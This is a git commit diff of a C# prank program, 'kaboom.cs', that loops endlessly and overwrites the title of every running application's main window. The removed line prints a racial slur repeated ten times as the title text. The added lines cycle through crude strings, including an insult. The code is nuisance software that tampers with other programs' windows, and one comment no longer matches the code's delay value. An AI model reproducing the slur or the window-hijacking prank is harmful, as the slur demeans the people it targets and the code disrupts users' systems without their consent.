c8b9a7bfa0a3d672ed96b258e34d4268fd8ef828
awesomeusername69420 <24661212+awesomeusername69420@users.noreply.github.com>
2022-01-09 21:05:18 -0500

    Update kaboom.cs

--- stuff/src/kaboom.cs
+++ stuff/src/kaboom.cs
@@ -1,4 +1,4 @@
-﻿/*
+/*
 *   Changes all main active window titles to be awesome!!
 */
 
@@ -7,22 +7,26 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
 
-namespace ConsoleApp1
+namespace kaboom
 {
-    class Program
+    internal class Program
     {
         [DllImport("user32.dll")]
         static extern bool SetWindowText(IntPtr hWnd, string text); // Thing used to change window text
 
+        public static string[] titles = {"HELLO", "HI", "HEY", "YOUR MOM IS FAT"};
+
         static void Main(string[] args)
         {
+            int cur = 0;
+
             while (true)
             {
                 foreach (Process p in Process.GetProcesses()) // Loop through processes
                 {
                     try
                     {
-                        SetWindowText(p.MainWindowHandle, "NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER NIGGER"); // Try to change its text to this
+                        SetWindowText(p.MainWindowHandle, titles[cur]); // Try to change its text to this
                     }
                     catch (Exception)
                     {
@@ -30,7 +34,14 @@ namespace ConsoleApp1
                     }
                 }
 
-                Thread.Sleep(40); // Wait 40 ms to prevent a crash while letting the system know the process is still alive
+                cur = cur + 1;
+
+                if (cur > titles.Length - 1)
+                {
+                    cur = 0;
+                }
+
+                Thread.Sleep(1500); // Wait 40 ms to prevent a crash while letting the system know the process is still alive
             }
         }
     }
